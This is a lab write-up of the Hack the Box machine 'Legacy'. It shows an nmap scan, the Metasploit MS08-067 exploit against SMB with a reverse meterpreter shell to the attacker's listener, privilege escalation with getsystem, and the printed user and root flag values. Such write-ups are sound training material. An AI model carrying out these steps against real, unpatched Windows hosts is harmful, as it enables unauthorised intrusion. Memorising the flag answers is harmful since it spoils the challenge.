Legacy is an easy level retired capture the flag machine from Hack the Box. This writeup will describe the techniques I used to bypass security controls and gain root access to the machine.

## Getting Started   
The first thing i did was conduct a basic <kbd>nmap</kbd> scan to search for the top 200 open ports on the target.  

```bash
──(kali㉿kali)-[~/Documents/htb/legacy]
└─$ nmap --top-ports 200 -Pn 10.10.10.4
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-07 14:50 EST
Nmap scan report for 10.10.10.4
Host is up (0.023s latency).
Not shown: 197 filtered ports
PORT     STATE  SERVICE
139/tcp  open   netbios-ssn
445/tcp  open   microsoft-ds
3389/tcp closed ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 2.57 seconds
                                                                                                                                                          
```  

The scan shows there are at least 2 open ports with services such as netbios and microsoft-ds running. Next, to get a better understanding of the services and version running, and to scan for basic vulnerabilities, I used the <kbd>nmapAutomator</kbd> script.  The below output only shows the most relevant information.  

```bash

The scan shows the target is likely vulnerable to CVE-2008-4250, a serious vulnerability also referred to by its [microsoft bulletin](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067) identifier, Microsoft Windows Server 2000/2003 - Code Execution (MS08-067). There is a public exploit for this vulnerability on metasploit (exploit/windows/smb/ms08_067_netapi), so next i started up the <kbd>msfconsole</kbd> and configured the necessary options.  

```bash
msf6 exploit(windows/smb/ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   10.10.10.4       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.3       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

msf6 exploit(windows/smb/ms08_067_netapi) > 
```  

Executing the exploit started a reverse meterpreter session on the target. Using the <kbd>getsystem</kbd> meterpreter command, I upgraded my privilege to SYSTEM. At this point I can start looking for the user and root flags.  

```bash
msf6 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175174 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.10.10.4:1028) at 2021-01-11 10:22:35 -0500

meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

```  

I used the <kbd>search</kbd> meterpreter command and found both flags. 

```bash
meterpreter > search -f *user.txt*
Found 1 result...
    c:\Documents and Settings\john\Desktop\user.txt (32 bytes)
meterpreter > cat "c:\Documents and Settings\john\Desktop\user.txt"
e69af0e4f443de7e36876fda4ec7644fmeterpreter > 
```  
```bash
meterpreter > search -f *root.txt*
Found 1 result...
    c:\Documents and Settings\Administrator\Desktop\root.txt (32 bytes)
meterpreter > cat "c:\Documents and Settings\Administrator\Desktop\root.txt"
993442d258b0e0ec917cae9e695d5713meterpreter > 
```  
## Conclusion  
Overall this was an easy CTF machine that was vulnerable to a very popular windows exploit.
